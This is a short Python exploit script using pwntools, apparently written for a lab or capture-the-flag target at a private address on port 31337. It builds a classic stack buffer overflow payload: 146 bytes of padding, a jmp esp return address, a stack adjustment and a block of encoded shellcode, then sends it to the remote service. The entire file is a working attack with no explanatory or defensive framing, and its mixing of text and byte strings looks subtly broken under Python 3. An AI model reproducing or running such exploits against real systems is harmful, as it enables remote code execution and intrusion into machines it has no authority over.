#!/usr/bin/python3

from pwn import *
import struct

host, port = '10.10.9.53' ,31337
context.log_level = 'critical'
ptr_jmp_esp = 0x080414C3
sub_esp_10 = "\x83\xec\x10"

buf_len = 1024
r = remote(host, port)
buf = ''
buf += 'A'*146
buf += struct.pack("<I", ptr_jmp_esp)
buf += sub_esp_10
buf += b"\xba\xd0\x93\xfa\xe9\xda\xc5\xd9\x74\x24\xf4\x5e\x2b"
buf += b"\xc9\xb1\x56\x31\x56\x13\x03\x56\x13\x83\xee\x2c\x71"
buf += b"\x0f\x15\x24\xf4\xf0\xe6\xb4\x99\x79\x03\x85\x99\x1e"
buf += b"\x47\xb5\x29\x54\x05\x39\xc1\x38\xbe\xca\xa7\x94\xb1"
buf += b"\x7b\x0d\xc3\xfc\x7c\x3e\x37\x9e\xfe\x3d\x64\x40\x3f"
buf += b"\x8e\x79\x81\x78\xf3\x70\xd3\xd1\x7f\x26\xc4\x56\x35"
buf += b"\xfb\x6f\x24\xdb\x7b\x93\xfc\xda\xaa\x02\x77\x85\x6c"
buf += b"\xa4\x54\xbd\x24\xbe\xb9\xf8\xff\x35\x09\x76\xfe\x9f"
buf += b"\x40\x77\xad\xe1\x6d\x8a\xaf\x26\x49\x75\xda\x5e\xaa"
buf += b"\x08\xdd\xa4\xd1\xd6\x68\x3f\x71\x9c\xcb\x9b\x80\x71"
buf += b"\x8d\x68\x8e\x3e\xd9\x37\x92\xc1\x0e\x4c\xae\x4a\xb1"
buf += b"\x83\x27\x08\x96\x07\x6c\xca\xb7\x1e\xc8\xbd\xc8\x41"
buf += b"\xb3\x62\x6d\x09\x59\x76\x1c\x50\x35\xbb\x2d\x6b\xc5"
buf += b"\xd3\x26\x18\xf7\x7c\x9d\xb6\xbb\xf5\x3b\x40\xca\x12"
buf += b"\xbc\x9e\x74\x72\x42\x1f\x84\x5a\x81\x4b\xd4\xf4\x20"
buf += b"\xf4\xbf\x04\xcc\x21\x55\x0f\x5a\xc0\xa2\x08\x4a\xbc"
buf += b"\xb6\x16\x49\x14\x3f\xf0\xdd\x36\x6f\xad\x9d\xe6\xcf"
buf += b"\x1d\x76\xed\xc0\x42\x66\x0e\x0b\xeb\x0d\xe1\xe5\x43"
buf += b"\xba\x98\xac\x18\x5b\x64\x7b\x65\x5b\xee\x89\x99\x12"
buf += b"\x07\xf8\x89\x43\x70\x02\x52\x94\x15\x02\x38\x90\xbf"
buf += b"\x55\xd4\x9a\xe6\x91\x7b\x64\xcd\xa2\x7c\x9a\x90\x92"
buf += b"\xf7\xad\x06\x9a\x6f\xd2\xc6\x1a\x70\x84\x8c\x1a\x18"
buf += b"\x70\xf5\x49\x3d\x7f\x20\xfe\xee\xea\xcb\x56\x42\xbc"
buf += b"\xa3\x54\xbd\x8a\x6b\xa7\xe8\x88\x6c\x57\x6e\xa7\xd4"
buf += b"\x3f\x90\xf7\xe4\xbf\xfa\xf7\xb4\xd7\xf1\xd8\x3b\x17"
buf += b"\xf9\xf2\x13\x3f\x70\x93\xd6\xde\x85\xbe\xb7\x7e\x85"
buf += b"\x4d\x6c\x71\xfc\x3e\x93\x72\x01\x57\xf0\x73\x01\x57"
buf += b"\x06\x48\xd7\x6e\x7c\x8f\xeb\xd4\x8f\xba\x4e\x7c\x1a"
buf += b"\xc4\xdd\x7e\x0f"
buf += "D"*(buf_len-len(buf))

print('Sent: {}'.format(buf))
r.sendline(buf)
data = r.recv()
print('Received: {}'.format(data.decode()))

r.close()